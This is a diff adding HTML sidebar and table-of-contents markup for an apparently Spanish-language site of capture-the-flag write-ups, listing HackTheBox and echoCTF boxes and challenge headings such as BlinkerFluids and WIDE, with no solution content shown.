+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_1" id="__nav_7_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Battlegrounds
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_1">
+            <span class="md-nav__icon md-icon"></span>
+            Battlegrounds
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Battlegrounds/Cyber%20Mayhem/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Cyber Mayhem
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Cyber Mayhem
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Boxes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            Boxes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_1" id="__nav_7_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Windows
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_1_1" id="__nav_7_2_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    1 Fácil
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            1 Fácil
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_1_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Active
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Active
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_1_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Devel
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Devel
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_1_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Remote
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Remote
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_1_2" id="__nav_7_2_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2 Medio
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            2 Medio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Chatterbox
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Chatterbox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/2%20Medio/Jeeves/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Jeeves
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Jeeves
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/2%20Medio/SecNotes/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    SecNotes
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            SecNotes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2_4" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/2%20Medio/Silo/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Silo
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Silo
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_1_3" id="__nav_7_2_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    3 Difícil
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            3 Difícil
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_3_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Control
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Control
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_3_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Search
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Search
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_3" id="__nav_7_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_3_1" id="__nav_7_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Mobile
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Mobile
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_3_1_1" id="__nav_7_3_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Medium
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_3_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Medium
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_1_1_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    SeeTheSharpFlag
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_3_1_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3_1_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            SeeTheSharpFlag
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    echoCTF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            echoCTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Boxes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1">
+            <span class="md-nav__icon md-icon"></span>
+            Boxes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_1_1" id="__nav_8_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2 Básico
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            2 Básico
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_1_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../echoCTF/Boxes/2%20B%C3%A1sico/Flanders/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Flanders
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_1_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Flanders
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_1_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../echoCTF/Boxes/2%20B%C3%A1sico/Smithers/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Smithers
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_1_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Smithers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_1_2" id="__nav_8_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    3 Intermedio
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            3 Intermedio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_2_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../echoCTF/Boxes/3%20Intermedio/Alister/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Alister
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Alister
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_1_3" id="__nav_8_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    5 Experto
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            5 Experto
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_3_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../echoCTF/Boxes/5%20Experto/Gogo%20Yubari/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Gogo Yubari
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_1_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Gogo Yubari
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#indice" class="md-nav__link">
+    <span class="md-ellipsis">
+      Índice
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      Intro
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#retos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Retos
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Retos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kryptos-support" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kryptos Support
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Kryptos Support">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stats" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solucion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solución
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blinkerfluids" class="md-nav__link">
+    <span class="md-ellipsis">
+      BlinkerFluids
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="BlinkerFluids">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stats_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solucion_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solución
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pwn
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pwn">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#space-pirate-entrypoint" class="md-nav__link">
+    <span class="md-ellipsis">
+      Space Pirate: Entrypoint
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Space Pirate: Entrypoint">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stats_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solucion_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solución
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reversing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reversing
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reversing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#wide" class="md-nav__link">
+    <span class="md-ellipsis">
+      WIDE
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WIDE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stats_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solucion_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solución
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
